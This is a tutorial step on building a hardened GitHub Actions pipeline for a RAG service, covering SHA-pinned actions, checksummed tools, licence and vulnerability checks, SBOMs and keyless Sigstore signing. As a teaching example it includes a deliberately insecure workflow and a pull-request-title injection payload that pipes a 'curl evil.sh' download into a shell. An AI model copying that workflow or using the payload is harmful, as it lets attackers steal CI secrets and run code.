# Step 27 · A CI pipeline and a secured supply chain

*Step 27 of 38 · Phase G · Quality & delivery*

## At a glance

| | |
|---|---|
| **Goal** | Every pull request is checked by a machine before a person reviews it, and every image that reaches `main` is built once, scanned, signed and documented, so you can prove later exactly what runs and where it came from. |
| **How, in one sentence** | GitHub Actions runs the same `just` recipes you run on your Mac (lint, types, tests, policy, prompts, cards, dashboards, alert rules), plus a supply-chain job (secrets, workflow security, known vulnerabilities, licences, Dockerfile) and an image job (build, Trivy, SBOM). On `main`, a release workflow pushes the image by digest, signs it keylessly with Sigstore and attaches build provenance and the SBOM. |
| **Time** | About 3 hours, plus a few minutes of clicking in GitHub settings. |
| **You'll end up with** | `ci.yml` (checks, supply-chain, image), `release.yml` (publish, sign, attest), `evals.yml` (Step 26's evaluations on your Mac as a self-hosted runner) and Dependabot · every action pinned to a commit SHA, every tool binary pinned to a SHA-256 (`ci/tools.yaml`, `just tools`), least-privilege permissions · a licence policy for Python dependencies, a vulnerability audit of `uv.lock`, and tests that enforce the pipeline's own rules · a fix for a real break: Step 26 had silently broken the Docker build, and the new checks catch it · branch protection: nothing merges without green checks and an owner's review · 20 new tests (190 in the guide's count) · ADR-0027. |
| **New words** | continuous integration (CI), workflow, job, step, runner (hosted, self-hosted), action, `GITHUB_TOKEN`, permissions, OIDC, pinning by SHA, software supply chain, supply-chain attack, CVE, SBOM, CycloneDX/SPDX, provenance, attestation, SLSA, Sigstore (cosign, Fulcio, Rekor), keyless signing, digest, transparency log, branch protection, Dependabot, OpenSSF Scorecard. |

## The big idea

> **ANALOGY · THE FOOD FACTORY**
> A food factory doesn't trust its cooks to taste-test their own dishes. Every batch passes the same inspection
> line: temperatures logged, allergens checked, a sample to the lab. Nothing leaves without passing.
>
> The factory also checks what comes in. Every supplier is approved, every delivery is checked against the order,
> and an ingredient that arrives in a different package than expected is refused.
>
> Every box that goes out carries:
> - an ingredients list
> - a batch number
> - a tamper-evident seal
>
> So when something goes wrong, they can trace it to a delivery, a line and a shift in minutes, and recall exactly
> the affected boxes.
>
> In this step, the inspection line is CI. The approved suppliers are pinned actions, tools and dependencies. The
> ingredients list is the SBOM, the batch number is the image digest with its provenance, and the seal is the
> signature.

The pipeline, end to end:

```
pull request ──► checks        (lint · types · tests · policy · prompts · cards)  ─┐
             ──► supply-chain  (secrets · workflows · CVEs · licences)            ─┼─► all green + owner review ─► merge
             ──► image         (build · scan · SBOM; after checks)                ─┘
             ──► evals         (self-hosted Mac; only when prompts/evals change; approval required)

main ──► release: build once → push by digest → sign (keyless, Sigstore) → attest provenance + SBOM
         image = ghcr.io/…/rag-api@sha256:…
         └─► deploy (Step 29) verifies signature + provenance before anything runs
```

The same `just` recipes run on your Mac and in CI: a red check is reproducible on your machine.

*(Figure 85 in the guide: the pipeline. A pull request runs checks, supply-chain and image jobs, and evaluations on
your Mac when prompts change. Merging needs all green and an owner's review. Main builds the image once, signs it,
attests provenance and SBOM, and pushes it by digest. Deployment (Step 29) verifies before running.)*

## What we're doing

1. Make every CI check a `just` recipe, so CI and your Mac run identical commands.
2. Pin tool binaries by SHA-256 (`ci/tools.yaml`) and actions by commit SHA.
3. Add supply-chain checks: secrets, workflow security, vulnerable dependencies, licences, Dockerfile
   misconfigurations.
4. Write the workflows: `ci.yml`, `release.yml` (signed, attested images), `evals.yml` (self-hosted, approval
   required), and Dependabot.
5. Fix the image build that Step 26 broke, and add a test so it can't happen again.
6. Test the pipeline's own rules, then turn on branch protection.
7. Record ADR-0027.

## Why we're doing this

> **WHY THIS MATTERS**
> Until now, "it works" meant "it worked on my Mac when I remembered to run the tests". That fails three ways:
> - **People forget.** One skipped test run is how a broken build reaches `main`. It happened in this guide: Step
>   26 added a workspace package, and the Docker image stopped building. No test failed, because no test built
>   the image.
> - **Attackers target the pipeline.** Modern attacks rarely break into the application; they poison what it's
>   built from. In March 2025, a popular GitHub Action (`tj-actions/changed-files`) had its version tags silently
>   moved to malicious code that printed secrets into build logs, in thousands of repositories. Repositories that
>   had pinned the action to a commit SHA were unaffected.
> - **You can't answer basic questions.** "Which images contain this vulnerable library?" "Was this image really
>   built from our repository?" Without SBOMs and provenance, you can't say.

| Need | How this step meets it |
|---|---|
| No change merges untested | CI on every PR; branch protection requires green checks and a CODEOWNERS review |
| Local and CI agree | CI runs `just` recipes; tools pinned by checksum in `ci/tools.yaml` |
| Dependencies safe to use | pip-audit (known vulnerabilities) and a licence policy, on exactly what `uv.lock` installs |
| CI itself can't be hijacked | Actions pinned by SHA, least-privilege permissions, no `pull_request_target`, zizmor and actionlint |
| No secrets in history | gitleaks over the whole git history |
| Images free of known critical holes | Trivy fails the build on fixable HIGH/CRITICAL vulnerabilities |
| Know what's in each image | SBOM (CycloneDX) per build, attested to the image |
| Prove where an image came from | Build provenance (SLSA) and a keyless Sigstore signature on the digest |
| Keep pins current without effort | Dependabot pull requests, each one tested by CI |

> **IN A COMPANY**
> Software supply-chain security moved from good practice to requirement after high-profile attacks (SolarWinds
> in 2020, Log4Shell in 2021, the xz backdoor in 2024):
> - US Executive Order 14028 (2021) made SBOMs and secure build practices expected of software sold to the US
>   government.
> - NIST's Secure Software Development Framework (SSDF, SP 800-218) lists the practices.
> - SLSA ("salsa", Supply-chain Levels for Software Artifacts) grades how trustworthy your build provenance is.
> - The EU Cyber Resilience Act requires manufacturers of products with digital elements to manage
>   vulnerabilities and document components (an SBOM). Its reporting duties start in 2026 and its main
>   obligations apply from December 2027.
>
> The questions a security review asks:
> - Are your CI actions pinned?
> - Who can approve a merge?
> - Can you produce an SBOM for what's running?
> - Can you prove an image was built by your pipeline?
>
> This step answers each one.

## Key ideas

| Term | Plain-English meaning |
|---|---|
| CI (continuous integration) | Automatically checking every change, so problems are found before they're merged. |
| Workflow / job / step | A workflow (a YAML file in `.github/workflows/`) has jobs (run in parallel on fresh machines), which have steps (commands or actions). |
| Runner | The machine that runs a job: GitHub-hosted (fresh each time), or self-hosted (yours, e.g. the Mac with the models). |
| Action | A reusable step published by someone else (`actions/checkout`). Third-party code with access to your job. |
| `GITHUB_TOKEN`, permissions | A short-lived token each job gets automatically. `permissions` limits what it can do. |
| OIDC token | A signed statement from GitHub: "this job is repo X, workflow Y, branch Z". Used for keyless signing. |
| Pinning by SHA | Referring to an exact commit (`@3d3c42e…`) instead of a tag (`@v7`). Tags can be moved; commits can't. |
| Software supply chain | Everything your software is made from and with: dependencies, tools, actions, base images, the build itself. |
| CVE | A public ID for a known vulnerability (e.g. CVE-2021-44228, Log4Shell). |
| SBOM | Software bill of materials: the list of every component in an artefact, with versions. Formats: CycloneDX, SPDX. |
| Provenance, attestation | A signed statement of how and where an artefact was built (repo, commit, workflow, runner). |
| SLSA | A framework of levels for build integrity and provenance. |
| Sigstore: cosign, Fulcio, Rekor | Free signing infrastructure: cosign signs; Fulcio issues short-lived certificates; Rekor is a public transparency log. |
| Keyless signing | Signing with a short-lived certificate tied to the CI identity, instead of a long-lived private key. |
| Digest | `sha256:…` of an image's content. Unlike a tag, it can't point at different content later. |
| Branch protection | Repository rules: what must pass, and who must approve, before merging to `main`. |
| Dependabot | GitHub's bot that opens pull requests to update pinned versions. |

> **IN PLAIN ENGLISH · WHAT A "SUPPLY-CHAIN ATTACK" IS**
> Instead of attacking your running application, an attacker poisons something your application is *built from*:
> a library you install, a GitHub Action your pipeline runs, a tool binary you download, or the base image. Your
> own code is untouched, but the thing you ship now contains their code. Each check in this step guards one link.

### The chain, link by link

| Link | What goes wrong | What stops it here |
|---|---|---|
| Your code | A leaked secret, a bad merge | gitleaks · reviews · signed commits |
| Dependencies | A known CVE, a hostile licence | pip-audit · licence policy · Dependabot |
| CI actions & tools | A moved tag, a swapped binary | SHA pins · checksums · zizmor |
| The build | A tampered build machine | Fresh runners · build provenance |
| The image | Vulnerable OS packages | Trivy scan · slim, non-root image |
| Registry → deploy | A swapped image | Signature + digest verified (Step 29) |

A supply chain is as strong as its weakest link: each one gets its own check.

*(Figure 86 in the guide: the software supply chain from your code to deployment.)*

### Signing without keys

1. **Release job:** gets a GitHub OIDC token saying "repo X · release.yml · main".
2. **Fulcio:** issues a 10-minute certificate bound to that identity.
3. **cosign:** signs the image **digest** (not a tag: tags can move).
4. **Rekor:** a public, append-only log records the signature (like Step 23's anchors).

**Verify (before deploying):** is this digest signed by *this* repo's `release.yml` on `main`, and is the signature
in the public log? No private key exists anywhere, so there's none to steal, rotate or leak.

Classic signing needs a private key that someone must store, protect, rotate and never leak. Keyless signing
replaces it with the CI job's identity. The certificate says, verifiably, "signed by release.yml on main of this
repository". It expires minutes later, and the signature is recorded in a public, append-only log: the same idea
as Step 23's anchors, at internet scale.

*(Figure 87 in the guide: keyless signing.)*

## How to do it

On your Mac, in the project folder:

```bash
cd ~/dev/rag-platform
git switch -c ci/pipeline
```

### 1 · Pinned tools, verified by checksum

CI needs the same `opa`, `regal`, `dbmate`, scanners and signers you use. Installing them with `curl | sh` or a
moving "latest" means trusting whatever the download returns that day. Instead, one file lists the exact version,
URL and SHA-256 per platform: **`ci/tools.yaml`** (committed). It pins eight tools for `linux-amd64` (CI) and
`darwin-arm64` (your Mac):

| Tool | Version | What it's for |
|---|---|---|
| opa | 1.21.1 | Policy tests (Step 18) |
| regal | 0.43.0 | Rego linter (Step 18) |
| dbmate | 2.36.0 | Migrations, used by the audit-database tests (Step 23); hash is trust-on-first-use |
| actionlint | 1.7.12 | Workflow syntax and expression checks |
| gitleaks | 8.30.1 | Secret scanning over the whole history |
| trivy | 0.75.0 | Dockerfile and image vulnerability scanning |
| syft | 1.54.1 | SBOM generation |
| cosign | 3.1.3 | Signing and verifying |

The installer is **`scripts/ci_tools.py`**:

```text
just tools                  everything in ci/tools.yaml, into .tools/bin
just tools opa trivy        only these
```

> **READING THE INSTALLER**
> - **Hash first, everything else after:** the download is checked before it's unpacked, written or made
>   executable. A mismatch installs nothing (tested).
> - **Archives are handled carefully:** only the named file is taken, and only if it's a regular file. A symbolic
>   link pointing at `/etc/passwd` is refused (tested).
> - **`https://` only:** plain `http://` can be altered on the way.
> - **Write, then rename:** a half-written binary never appears under the real name.
> - **The hashes come from each project's own checksum file.** dbmate publishes none, so its hash is the one
>   recorded on first download ("trust on first use"). The file says so, and a reviewer can re-check it.

```bash
just tools                                       # all of them, into .tools/bin (git-ignored)
echo '.tools/' >> .gitignore                     # (already done in this repo)
echo 'PATH_add .tools/bin' >> .envrc && direnv allow   # the pinned tools come first on your PATH (Step 6's direnv)
```

Expected output:

```text
$ just tools
actionlint  1.7.12   verified -> .tools/bin/actionlint
cosign      3.1.3    verified -> .tools/bin/cosign
dbmate      2.36.0   verified -> .tools/bin/dbmate
gitleaks    8.30.1   verified -> .tools/bin/gitleaks
opa         1.21.1   verified -> .tools/bin/opa
regal       0.43.0   verified -> .tools/bin/regal
syft        1.54.1   verified -> .tools/bin/syft
trivy       0.75.0   verified -> .tools/bin/trivy
```

> **TIP · CHANGING A TOOL VERSION**
> Change the version, both URLs and both hashes in one pull request. Copy each hash from the project's published
> checksum file (`checksums.txt`, `*.sha256`), not from your own download, so a tampered download can't vouch for
> itself. Say "trust on first use" in the PR when a project publishes no checksums.

### 2 · A licence policy for dependencies

Model licences are checked in cards (Step 25). Code dependencies need the same care: one strong-copyleft library
in a product can carry obligations nobody planned for.

**`ci/licence-policy.yaml`** lists, by SPDX id:

- **allowed** — permissive licences: MIT, MIT-0, BSD-2/3-Clause, Apache-2.0, ISC, PSF-2.0, MPL-2.0 (file-level
  copyleft: fine for unmodified use), 0BSD, Unlicense, Zlib;
- **review_required** — allowed only with a recorded reason: LGPL-3.0-only, for psycopg (Step 11), used unmodified
  as a separately installed library;
- **denied** — strong copyleft or source-available: GPL-2.0/3.0, AGPL-3.0, SSPL-1.0, BUSL-1.1;
- **exceptions** — where metadata is missing or ambiguous, the licence a person verified by reading it (nodeenv,
  python-dateutil, python-discovery);
- **ignore** — our own workspace packages.

**`scripts/licences.py`** checks every installed package (`just licences`, `-v` to list them all).

> **READING THE LICENCE CHECK**
> - **Where licences come from:** the modern `License-Expression` (an SPDX expression, PEP 639) first; old-style
>   metadata only when it's unambiguous. "BSD License" alone isn't: BSD has 2-, 3- and 4-clause versions. Such
>   packages must be verified by a person and listed under `exceptions`.
> - **OR vs AND:** `Apache-2.0 OR BSD-3-Clause` means we choose, so the better option counts. `MIT AND
>   GPL-3.0-only` means both apply, so the worse one counts.
> - **Running it found things to decide:** nodeenv declared just "BSD"; python-dateutil declared "Dual License";
>   python-discovery put its whole licence text in the field; psycopg is LGPL: allowed only with a recorded
>   reason.
> - **It is not legal advice:** the policy file records decisions your legal team should confirm.

### 3 · One recipe per CI job

New recipes in the **`justfile`** (section "CI (Step 27)"):

| Recipe | What it runs |
|---|---|
| `just tools [names…]` | `scripts/ci_tools.py`: pinned, checksum-verified binaries into `.tools/bin` |
| `just ci` | Everything a pull request must pass: `ci-static ci-test ci-config policy-check ci-supply-chain` |
| `just ci-static` | `uv sync --locked --all-packages`, `ruff check`, `ruff format --check`, `mypy` |
| `just ci-test` | `uv run pytest -q` (with Postgres in CI, so the audit tests run too) |
| `just ci-config` | `prompts lint`, `prompts-check-main`, `cards lint`, `cards docs --check`, `dashboards-check`, `alerts-test` |
| `just ci-supply-chain` | gitleaks over history, actionlint, zizmor 1.30.1, pip-audit 2.10.1 on `uv.lock`'s export, the licence check, Trivy on the Dockerfile |
| `just licences [-v]` | Just the licence check |
| `just image-scan` | Build the image locally, Trivy scan it, write a CycloneDX SBOM to `.tools/rag-api.cdx.json` (needs Docker) |
| `just image-verify <digest>` | `cosign verify` (identity = this repo's `release.yml` on `main`) and `gh attestation verify` |

> **READING THE RECIPES**
> - `just ci` runs on your Mac exactly what a pull request must pass. If CI is red, the same recipe reproduces it
>   locally.
> - `ci-test` runs every test. In CI, a Postgres service container provides `AUDIT_TEST_ADMIN_DSN`, so the Step 23
>   audit-database tests run there too. Locally, `just audit-test` does the same.
> - `ci-supply-chain`:
>   - **gitleaks** scans the whole git history, because a secret deleted in a later commit is still in the
>     history.
>   - **actionlint** checks workflow syntax and expressions; **zizmor** checks workflow security: unpinned
>     actions, dangerous triggers, script injection, credential leaks.
>   - **pip-audit** checks the exact versions in `uv.lock` against known vulnerabilities.
>   - **Trivy** checks the Dockerfile for misconfigurations.
> - Tool versions are pinned (`zizmor==1.30.1`, `pip-audit==2.10.1`), like everything else.

### 4 · The image build was broken (and the checks found it)

Running these checks for the first time found a real problem. Step 26 added `libs/rag-evals` to the workspace, but
the Dockerfile copies each member's `pyproject.toml` before installing dependencies, and `rag-evals` wasn't among
them. `uv sync --locked` then sees a different workspace than `uv.lock` describes, and refuses:

```text
error: The lockfile at `uv.lock` needs to be updated, but `--locked` was provided.
```

The image would not have built since Step 26. The fix is one line in **`services/rag-api/Dockerfile`**:

```dockerfile
COPY libs/rag-common/pyproject.toml libs/rag-common/
# Every workspace member's manifest must be present, or `uv sync --locked` fails (Step 27)
COPY libs/rag-evals/pyproject.toml libs/rag-evals/
COPY services/rag-api/pyproject.toml services/rag-api/
```

Only `rag-evals`'s manifest is copied, not its code. `--package rag-api` installs rag-api's dependencies only, so
the image contains no evaluation tools, moto or ruamel (checked by listing its installed packages). The prompt
registry (`COPY prompts /app/prompts`, Step 24) is already in the runtime stage.

> **WATCH OUT · A SECOND CATCH, BY TRIVY**
> The first version of that fix had a comment on the same line: `COPY libs/rag-evals/pyproject.toml
> libs/rag-evals/ # every workspace member…`. Dockerfiles don't support end-of-line comments, so Docker would read
> `#`, `every`, `workspace` … as more files to copy. Trivy's Dockerfile check flagged it as CRITICAL (DS-0011:
> "Slash is expected at the end of COPY command argument"). Comments go on their own line.

A test now compares the Dockerfile with the workspace members, so adding a package without updating the image fails
CI (see section 7).

### 5 · The workflows

**`.github/workflows/ci.yml`** — every pull request, every push to `main`, and the merge queue (`merge_group`):

- `permissions: contents: read` at the top; `concurrency` cancels an outdated run of the same pull request.
- **checks** (`lint, types, tests, policy, registries`): a throwaway `pgvector/pgvector:0.8.7-pg17@sha256:…`
  Postgres service on port 55432 (same pinned image as `rag-db`), `AUDIT_TEST_ADMIN_DSN` pointing at it; checkout
  with `persist-credentials: false` and `fetch-depth: 0` (for `prompts-check-main`); `astral-sh/setup-uv` with uv
  0.11.32 (same as the Dockerfile); `uv tool install rust-just==1.58.0`; `ci_tools.py opa regal dbmate`; psql from
  `postgresql-client`; then `just ci-static`, `just ci-test`, `just ci-config`, `just policy-check`.
- **supply-chain** (`secrets, workflows, dependencies, licences`): full-history checkout for gitleaks;
  `ci_tools.py gitleaks actionlint trivy`; `uv sync --locked --all-packages`; `just ci-supply-chain` with
  `GH_TOKEN` so zizmor can run its online audits (checking pinned SHAs really belong to each action).
- **image** (`build and scan the rag-api image`, after checks): Buildx build with `load: true, push: false`;
  `trivy image --exit-code 1 --severity HIGH,CRITICAL --ignore-unfixed rag-api:ci`; `syft scan … -o
  cyclonedx-json`; the SBOM uploaded as an artifact for 30 days.

> **READING CI.YML**
> - `permissions: contents: read` at the top: every job can read the code and nothing else. Writing (packages,
>   signatures) is granted only in `release.yml`, only to the job that needs it.
> - Every `uses:` is a 40-character commit SHA, with the version in a comment for humans. Dependabot updates both
>   together.
> - `persist-credentials: false`: by default, checkout leaves the job's token in `.git/config`, where any later
>   step (or an uploaded artifact) could pick it up.
> - The Postgres service is a throwaway container, with the same pinned image as rag-db, for the audit-log tests.
> - The image job builds with Buildx but doesn't push from a pull request. It scans with Trivy, failing on fixable
>   HIGH/CRITICAL vulnerabilities (`--ignore-unfixed`: a vulnerability with no fixed version can't be fixed by you
>   today; track it, don't block on it). It also uploads the SBOM.
> - `concurrency` cancels an outdated run when you push again to the same pull request.

The actions and the commit each one is pinned to (each verified with `git ls-remote` against the action's
repository):

| Action | Version | Commit |
|---|---|---|
| `actions/checkout` | v7.0.1 | `3d3c42e5aac5ba805825da76410c181273ba90b1` |
| `astral-sh/setup-uv` | v10.3.0 | `1c37ad07a6a961277cf70c0d37d6f313000f5884` |
| `docker/setup-buildx-action` | v4.4.1 | `f87e5991a6d7451dcb8d9637bfbc97413f497069` |
| `docker/build-push-action` | v7.4.0 | `c3c9e263c25d99ce0380d002d59b67737d91b0dc` |
| `docker/login-action` | v4.6.0 | `dbcb813823bdd20940b903addbd779551569679f` |
| `actions/upload-artifact` | v7.0.2 | `cf430e030ddbb5b0abf93d22962f4752f3646cd9` |
| `actions/attest-build-provenance` | v4.2.2 | `4d101475d8b20a2381f78447822ac1eab6504dd8` |
| `actions/attest` | v4.2.2 | `1e69f48acb82d1966a394da916b4c1698aa569d6` |

**`.github/workflows/release.yml`** — on `main` only. One job, `publish`, builds the image once, pushes it to
`ghcr.io/<owner>/<repo>/rag-api:sha-<commit>`, signs the **digest** with `cosign sign --yes`, makes an SBOM of
exactly what was pushed, attests SLSA build provenance and the SBOM, and writes the digest and the verify command
into the run summary.

> **READING RELEASE.YML**
> - `permissions: {}` at the top. The one job asks for exactly four rights: `contents: read`; `packages: write`,
>   to push to ghcr.io; `id-token: write`, the OIDC token for keyless signing; `attestations: write`.
> - **Built once, then referred to by digest:** the signature, SBOM and provenance all name `@sha256:…`, never the
>   tag. What was scanned and signed is exactly what will be deployed.
> - `cosign sign` signs keylessly: no key is stored in secrets.
> - `actions/attest-build-provenance` records which repository, commit, workflow and runner built the digest
>   (SLSA build provenance).
> - `actions/attest` with `sbom-path` attaches the SBOM. The older `actions/attest-sbom` now just prints a
>   deprecation warning and calls `actions/attest`, so this uses `actions/attest` directly.
> - **Values pass through `env:`, not `${{ }}` inside `run:`.** Inserting expressions into shell scripts is how
>   workflows get script-injected (zizmor's template-injection check).
> - **No cache in the release job:** a poisoned build cache must never reach a signed release.

**`.github/workflows/evals.yml`** — evaluations need the models, which run on your Mac. The Mac becomes a
self-hosted runner. It triggers on pull requests touching `prompts/**`, `evals/**`, `libs/rag-evals/**`,
`services/rag-api/src/rag_api/search.py` or `policies/**`, and on manual dispatch; runs on
`[self-hosted, macOS, ARM64, rag-models]` in the `evals` environment (approval required); runs
`just evals run retrieval`, gates the newest retrieval run, runs the answer suite for `rag-answer` at `staging`,
gates it, and always uploads `evals/runs/` for 90 days. `concurrency: evals` keeps one evaluation at a time (the
GPU is shared).

> **WATCH OUT · SELF-HOSTED RUNNERS AND FORKS**
> A self-hosted runner executes the pull request's code on your machine. A pull request from a fork could contain
> anything. So the job runs only for branches of this repository (`head.repo.full_name == github.repository`), and
> only after an approval (the `evals` environment with a required reviewer). For a public repository, GitHub's own
> advice is not to attach self-hosted runners at all.
>
> To set one up: GitHub → Settings → Actions → Runners → New self-hosted runner (macOS, ARM64), give it the label
> `rag-models`, and run it as your user so sops can use your age key (Step 6).

**`.github/actionlint.yaml`** tells actionlint that `rag-models` is our own self-hosted runner label.

**`.github/dependabot.yml`** opens weekly pull requests for three ecosystems: `github-actions` (rewrites the SHAs
and their `# vX.Y.Z` comments; all grouped together), `uv` (`uv.lock`; minor and patch grouped) and `docker` (the
base images in `services/rag-api/Dockerfile`, tags and digests).

> **TIP · PINNED AND CURRENT AT THE SAME TIME**
> Pinning everything makes builds reproducible, but pins go stale and miss security fixes. Dependabot opens weekly
> pull requests that move the pins (action SHAs, `uv.lock`, base images), and CI tests each one before anyone
> merges it. `ci/tools.yaml` isn't something Dependabot understands: put a monthly reminder in your calendar, or add
> it to Renovate later.

### 6 · What the checks look for

`just ci-supply-chain` on the real repository (without a GitHub token, so zizmor uses its offline checks only):

```text
gitleaks git --no-banner --redact .
    … commits scanned.  no leaks found
actionlint
uvx zizmor==1.30.1 --min-severity medium .github/workflows
No findings to report. Good job! (1 suppressed)
uv export --quiet --frozen --all-packages --all-groups --no-emit-workspace --format requirements-txt -o .tools/requirements.txt
uvx pip-audit==2.10.1 --disable-pip --requirement .tools/requirements.txt --progress-spinner off
No known vulnerabilities found
uv run python scripts/licences.py
REVIEW   psycopg 3.3.6: LGPL-3.0-only psycopg (Step 11): used unmodified …
REVIEW   psycopg-binary 3.3.6: LGPL-3.0-only …
REVIEW   psycopg-pool 3.3.3: LGPL-3.0-only …
107 packages: 104 ok, 3 review, 0 unknown, 0 denied
trivy config --exit-code 1 --severity HIGH,CRITICAL services/rag-api/Dockerfile
│ Dockerfile │ dockerfile │ 0 │
```

To see what zizmor protects against, here is a deliberately bad workflow (**never write this**). It's a common
pattern in real repositories:

```yaml
name: bad
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: echo "Testing ${{ github.event.pull_request.title }}"
```

zizmor's verdict:

```text
warning[artipacked]: credential persistence through GitHub Actions artifacts
warning[excessive-permissions]: overly broad permissions
error[dangerous-triggers]: use of fundamentally insecure workflow trigger
error[template-injection]: code injection via template expansion
error[unpinned-uses]: unpinned action reference
8 findings (3 suppressed, 2 unsafe fixes): 0 informational, 0 low, 2 medium, 3 high
```

> **WHY EACH ONE MATTERS**
> - `dangerous-triggers`: `pull_request_target` runs with the base repository's secrets and write token, but this
>   workflow checks out the fork's code. Anyone can open a pull request that steals them.
> - `template-injection`: a pull request titled `"; curl evil.sh | sh; echo "` becomes part of the shell script.
> - `unpinned-uses`: `@v4` can be moved, as `tj-actions/changed-files` was.
> - `artipacked`: the checkout token stays on disk.
> - `excessive-permissions`: no `permissions:` block means the token gets the repository's default rights,
>   possibly write.

And what a signature buys you, shown with a local key because keyless signing needs GitHub's OIDC (the release
workflow does it for real):

```text
$ cosign generate-key-pair                    # demo only: CI signs keyless, with no key to keep or leak
Private key written to cosign.key
Public key written to cosign.pub

$ cosign sign-blob --key cosign.key --bundle sbom.bundle \
    --use-signing-config=false --tlog-upload=false rag-api.cdx.json      # offline: no public log
Wrote bundle to file sbom.bundle

$ cosign verify-blob --key cosign.pub --bundle sbom.bundle --insecure-ignore-tlog=true rag-api.cdx.json
Verified OK

# change one character in the SBOM, then verify again:
$ cosign verify-blob --key cosign.pub --bundle sbom.bundle --insecure-ignore-tlog=true rag-api.cdx.json
error during command execution: failed to verify signature: could not verify message: invalid signature when validating ASN.1 encoded signature
```

Changing a single character in the signed file makes verification fail. That's what `just image-verify` (and, in
Step 29, the cluster) relies on. Delete `cosign.key` afterwards; it must never be committed (`*.key` is already
git-ignored).

### 7 · Test the pipeline's own rules

zizmor and actionlint are general-purpose. The platform also has its own rules, so they're tests: readable, and
impossible to forget.

**`tests/test_ci_policy.py`** (10 tests):

- every `uses:` is pinned to a 40-hex commit SHA with a `# vX.Y.Z` comment (×3 workflows);
- top-level permissions are `{}` or `contents: read`, no `pull_request_target`, every checkout has
  `persist-credentials: false` (×3 workflows);
- only `release.yml`'s `publish` job may write, and only `contents: read, packages: write, id-token: write,
  attestations: write` — a workflow that quietly gains `contents: write` fails;
- a self-hosted job must have the fork guard and an approval environment;
- `ci.yml` runs `just ci-static`, `ci-test`, `ci-config`, `policy-check` and `ci-supply-chain`;
- the Dockerfile copies every workspace member's `pyproject.toml` and the prompt registry. Run against the Step 26
  Dockerfile, this test fails with `Dockerfile misses libs/rag-evals/pyproject.toml`: exactly the break above.

> **WATCH OUT · YAML'S `on:` TRAP**
> YAML 1.1 (PyYAML) reads the key `on` as the boolean `true` (Step 25's trap), so the tests move it back to `"on"`
> before checking triggers.

**`tests/test_ci_tools.py`** (6 tests): a binary is installed executable; an archive member is extracted; a checksum
mismatch installs nothing (not even a partial file); a symlink member and a missing member are refused; plain
`http://` and an unknown platform are refused; the manifest is complete (all eight tools, https GitHub URLs
containing the version, 64-hex hashes, both platforms).

**`tests/test_licences.py`** (4 tests): OR and AND expressions; where licences are read from (expression, short
field, classifiers; ambiguous "BSD License" and whole licence texts are refused); each verdict; and the real
environment passes with exactly psycopg's three packages under review.

```bash
just ci              # everything a PR must pass, locally
just audit-test      # all tests, including the audit database tests
```

> **WHAT YOU SHOULD SEE**
> In the guide: 190 passed — 170 from before, 10 pipeline-rule tests, 6 installer tests, 4 licence tests. Beyond the
> tests, `just ci` itself runs green: ruff, mypy and every test with the Postgres service; regal and `opa test`
> (24/24); prompts, including against `main`; cards, dashboards; actionlint and zizmor (no findings); gitleaks,
> pip-audit (no known vulnerabilities), licences, and Trivy on the Dockerfile. The Docker-dependent parts
> (`alerts-test`, `image-scan`) need Docker, so they run in CI or on your Mac.

### 8 · Protect main

In GitHub → Settings → Rules → Rulesets → New branch ruleset for `main`:

| Rule | Setting |
|---|---|
| Require a pull request before merging | 1 approval; require review from Code Owners; dismiss stale approvals on new commits |
| Require status checks to pass | `lint, types, tests, policy, registries`, `secrets, workflows, dependencies, licences`, `build and scan the rag-api image`; require branches to be up to date |
| Require signed commits | On (you sign with SSH since Step 4) |
| Require linear history | On (squash merges, as you've done since Step 4) |
| Block force pushes, restrict deletions | On |

Also, in Settings → Actions → General:

- Allow only actions from GitHub and verified creators, plus the ones listed in the workflows.
- Set the default `GITHUB_TOKEN` permissions to read.
- Require approval for workflows from outside collaborators.

Finally, create the `evals` environment with yourself as required reviewer.

After the first merge to `main`:

```bash
gh run list --workflow release.yml --limit 1
just image-verify sha256:<digest from the run summary>     # "signature OK" + attestation verified
```

### 9 · Record the decision

```bash
just adr "Run CI with pinned tools and publish signed, attested images"
```

The result is `docs/adr/0027-run-ci-with-pinned-tools-and-publish-signed-attested-images.md`: GitHub Actions with
the three workflows; actions pinned by SHA, tools by SHA-256; read-only default permissions; no
`pull_request_target`; Dependabot; repository rules; pipeline rules enforced by tests. Alternatives: GitLab CI /
Jenkins / Buildkite, a long-lived cosign key pair, Docker Content Trust (Notary v1), Snyk / GitHub Advanced
Security, Renovate.

```bash
git add -A
git commit -m "ci: pinned, least-privilege pipeline with supply-chain checks; signed and attested releases"
git push -u origin ci/pipeline
gh pr create --fill          # the first pull request checked by the new pipeline
gh pr checks --watch
gh pr merge --squash --delete-branch
git switch main && git pull
```

## Benefits

- **Nothing merges untested:** every change gets the full suite, identical to `just ci` on your Mac.
- **Real bugs caught:** the broken image build from Step 26, and a Dockerfile line that would have failed.
- **Attacks on the pipeline blunted:** SHA pins, checksummed tools, read-only tokens, no dangerous triggers,
  workflow security scanning.
- **Dependencies under control:** known vulnerabilities and licences checked on exactly what `uv.lock` installs.
- **Traceable, verifiable images:** SBOM, provenance and a keyless signature on every digest.
- **Kept current:** Dependabot moves the pins; CI proves each move is safe.

## Drawbacks and risks

- **Pin maintenance:** Dependabot pull requests every week; `ci/tools.yaml` by hand.
- **Scanners have false positives and gaps:** a clean Trivy or pip-audit run means "nothing known", not "safe".
- **Self-hosted runner risk:** your Mac runs pipeline code. The fork guard and approvals are essential; never
  attach it to a public repository.
- **Signatures prove origin, not goodness:** a malicious commit merged to `main` is built and signed like any
  other. Reviews and branch protection remain the gate.
- **CI minutes and time:** the full pipeline takes several minutes per push; cache dependencies (not in release),
  and parallelise jobs.

## Alternatives

| Option | What it is, in plain words | Choose it when |
|---|---|---|
| GitHub Actions (our choice) | CI built into GitHub, with OIDC, attestations and a large action ecosystem | Your code is on GitHub |
| GitLab CI, Jenkins, Buildkite, Tekton | Other CI systems; some self-hosted | Your code or company standard is elsewhere |
| Trivy / Grype / Snyk / Docker Scout | Image and dependency vulnerability scanners | Trivy is open and broad; others add databases or UI |
| Syft / Trivy SBOM / BuildKit SBOM | Ways to produce SBOMs | Any; CycloneDX and SPDX are both widely accepted |
| Sigstore keyless / cosign key pair / Notary v2 | Ways to sign images | Keyless for public CI; keys when air-gapped |
| OpenSSF Scorecard | Automated score of a repository's security practices | Public repositories; a quick external check |
| Renovate | A more configurable update bot | Many repositories, custom pin files |

## Which approach fits which situation

| Situation | Best choice |
|---|---|
| Private repository, one team | This step, with the self-hosted evals runner |
